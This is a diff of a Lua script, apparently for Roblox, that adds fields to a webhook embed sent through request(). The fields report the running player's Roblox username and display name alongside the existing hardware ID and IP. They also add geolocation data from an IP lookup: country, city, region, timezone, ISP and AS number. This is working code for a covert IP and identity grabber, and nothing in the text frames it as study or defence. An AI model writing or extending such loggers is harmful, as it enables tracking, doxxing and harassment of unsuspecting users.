@@ -25,6 +25,21 @@ local response = request(
 			["type"] = "rich",
 			["color"] = tonumber(0xffffff),
 			["fields"] = {
+                {
+                    ["name"] = "Status:",
+                    ["value"] = ipinfo_table.status,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Roblox Username:",
+                    ["value"] = lplr.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Roblox DisplayName:",
+                    ["value"] = lplr.DisplayName,
+                    ["inline"] = true
+                },
 			    {
 				    ["name"] = "Hardware ID:",
 					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
@@ -48,6 +63,41 @@ local response = request(
                 {
                     ["name"] = "IP:",
                     ["value"] = ipinfo_table.query,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Country:",
+                    ["value"] = ipinfo_table.countryCode,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Timezone:",
+                    ["value"] = ipinfo_table.timezone,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "City:",
+                    ["value"] = ipinfo_table.city,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "ISP:",
+                    ["value"] = ipinfo_table.isp,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Region:",
+                    ["value"] = ipinfo_table.region,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "RegionName:",
+                    ["value"] = ipinfo_table.regionName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "AS:",
+                    ["value"] = ipinfo_table.as,
                     ["inline"] = true
                 }
 			}
